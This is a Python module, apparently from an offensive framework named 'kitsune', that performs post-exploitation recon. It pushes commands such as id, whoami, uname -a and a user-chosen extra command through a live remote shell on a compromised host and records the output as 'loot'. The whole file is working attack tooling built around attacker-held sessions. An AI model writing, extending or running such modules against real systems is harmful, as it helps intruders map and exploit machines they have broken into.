"""post/enum — быстрый intel по живой сессии: id/uname/whoami/hostname + окружение."""

from kitsune import db
from kitsune.framework import Module

DEFAULT_CMDS = ["id", "whoami", "hostname", "uname -a", "pwd"]


class Module(Module):
    meta = {
        "name": "post/enum",
        "author": "kitsune",
        "description": "Run safe recon commands over a live session, collect into loot",
        "options": {
            "session": {"default": "", "required": False, "desc": "session index (default: last)"},
            "extra":   {"default": "", "required": False, "desc": "extra command to run, e.g. 'cat /etc/os-release'"},
        },
    }

    def run(self):
        sessions = self.fw.sessions
        if not sessions:
            self.fail("no live sessions — съер the shell via payloads/listener first")
            return
        try:
            idx = int(self.session) if self.session else len(sessions) - 1
            sess = sessions[idx]
        except (IndexError, ValueError):
            self.fail(f"session index 0..{len(sessions)-1}")
            return

        conn = sess["conn"]
        cmds = list(DEFAULT_CMDS)
        if self.extra:
            cmds.append(self.extra)

        self.status(f"post-enum on {sess['host']} — {len(cmds)} command(s)")
        rows = []
        for cmd in cmds:
            try:
                conn.sendall(cmd.encode() + b"\n")
            except OSError as e:
                self.fail(f"session dead: {e}")
                return
            conn.settimeout(1.5)
            buf = b""
            import socket as _socket
            try:
                while True:
                    chunk = conn.recv(4096)
                    if not chunk:
                        break
                    buf += chunk
            except _socket.timeout:
                pass
            except OSError:
                self.fail("connection lost mid-enum")
                return
            out = buf.decode("utf-8", errors="replace").strip().replace("\n", " | ")[:90]
            rows.append((cmd, out if out else "(no output)"))
            db.add_loot("post_enum", sess["host"], f"{cmd} -> {out}")

        self.ok("collected -> loot (post_enum)")
        self.table(("Command", "Output"), rows)
